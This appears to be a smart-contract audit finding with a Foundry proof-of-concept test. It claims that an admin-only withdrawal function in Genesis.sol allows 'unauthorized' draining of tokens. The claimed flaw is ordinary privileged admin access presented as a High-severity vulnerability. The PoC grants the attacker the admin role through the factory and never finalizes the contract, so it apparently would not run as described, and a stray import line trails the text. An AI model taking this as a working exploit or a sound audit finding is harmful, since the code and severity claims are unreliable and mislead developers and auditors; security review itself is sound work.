[H-01] Unrestricted withdrawLeftAssetsAfterFinalized Allows Unauthorized Asset Drainage

Summary

The `withdrawLeftAssetsAfterFinalized` function in Genesis.sol is restricted to DEFAULT_ADMIN_ROLE but lacks additional safeguards, allowing any admin to withdraw all remaining assets (virtualToken or agentToken) from a finalized Genesis contract without validation. This critical vulnerability enables a malicious or compromised admin to drain funds, leading to significant financial loss for participants and undermining the protocol’s integrity.

Vulnerability Details

The withdrawLeftAssetsAfterFinalized function is defined as:

```solidity 
function withdrawLeftAssetsAfterFinalized(
    address to,
    address token,
    uint256 amount
) external onlyRole(DEFAULT_ADMIN_ROLE) nonReentrant whenEnded whenFinalized {
    require(token != address(0), "Invalid token address");
    require(amount <= IERC20(token).balanceOf(address(this)), "Insufficient balance to withdraw");

    IERC20(token).safeTransfer(to, amount);

    emit AssetsWithdrawn(genesisId, to, token, amount);
}
```

This function allows an address with DEFAULT_ADMIN_ROLE to withdraw any amount of any ERC20 token (up to the contract’s balance) to any address after the genesis event is finalized (whenEnded and whenFinalized). While it uses onlyRole(DEFAULT_ADMIN_ROLE), there are no additional checks to:

1. Validate the legitimacy of the withdrawal (e.g., ensuring assets are truly leftover).

2. Restrict the to address (e.g., to a predefined treasury).

3. Limit the frequency or total amount of withdrawals.

The `DEFAULT_ADMIN_ROLE` is granted to the `FGenesis` factory in initialize, but if this role is compromised or reassigned (via `AccessControl`’s `grantRole`), an attacker could drain all tokens, including virtualToken contributions or agentToken rewards.

Root Cause: Insufficient access control and validation in `withdrawLeftAssetsAfterFinalized`, allowing `DEFAULT_ADMIN_ROLE` holders to withdraw arbitrary tokens without oversight. See Genesis.sol#L448-L460

Impact

-Fund Loss: A malicious or compromised admin can drain all `virtualToken` or `agentToken` held by the contract, stealing participant contributions or rewards.

-Protocol Disruption: Unauthorized withdrawals undermine trust in the genesis event, potentially collapsing the protocol’s economy.

-Severity: High, due to direct financial loss and systemic impact.

Proof of Concept (PoC)

The following Foundry test demonstrates the exploit:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "forge-std/Test.sol";
import "../Genesis.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockVirtualToken is ERC20 {
    constructor() ERC20("VirtualToken", "VT") {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract GenesisTest is Test {
    Genesis genesis;
    MockVirtualToken virtualToken;
    address attacker = address(0xdead);
    address factory = address(0x1);
    address participant = address(0x2);

    function setUp() public {
        virtualToken = new MockVirtualToken();
        genesis = new Genesis();
        GenesisInitParams memory params = GenesisInitParams({
            genesisID: 1,
            factory: factory,
            startTime: block.timestamp + 1 days,
            endTime: block.timestamp + 2 days,
            genesisName: "Test Genesis",
            genesisTicker: "TGEN",
            genesisCores: new uint8[](1),
            tbaSalt: bytes32(0),
            tbaImplementation: address(0x3),
            daoVotingPeriod: 1 days,
            daoThreshold: 100,
            agentFactoryAddress: address(0x4),
            virtualTokenAddress: address(virtualToken),
            reserveAmount: 1000e18,
            maxContributionVirtualAmount: 100e18,
            agentTokenTotalSupply: 1000e18,
            agentTokenLpSupply: 500e18
        });
        vm.prank(factory);
        genesis.initialize(params);

        // Grant DEFAULT_ADMIN_ROLE to attacker
        vm.prank(factory);
        genesis.grantRole(genesis.DEFAULT_ADMIN_ROLE(), attacker);

        // Simulate participant contribution
        virtualToken.mint(participant, 100e18);
        vm.prank(participant);
        virtualToken.approve(address(genesis), 100e18);
        vm.prank(participant);
        genesis.participate(50, 100e18);
    }

    function testWithdrawAssets() public {
        // Fast forward to after endTime
        vm.warp(block.timestamp + 3 days);

        // Attacker withdraws all virtualToken
        uint256 contractBalance = virtualToken.balanceOf(address(genesis));
        vm.prank(attacker);
        genesis.withdrawLeftAssetsAfterFinalized(attacker, address(virtualToken), contractBalance);

        assertEq(virtualToken.balanceOf(attacker), contractBalance, "Attacker withdrew tokens");
        assertEq(virtualToken.balanceOf(address(genesis)), 0, "Contract drained");
    }
}
```
Execution: Run `forge test --match-path test/GenesisTest.sol`. The test shows an attacker with `DEFAULT_ADMIN_ROLE` draining all virtualToken from the contract.

import "../genesis/Genesis.sol";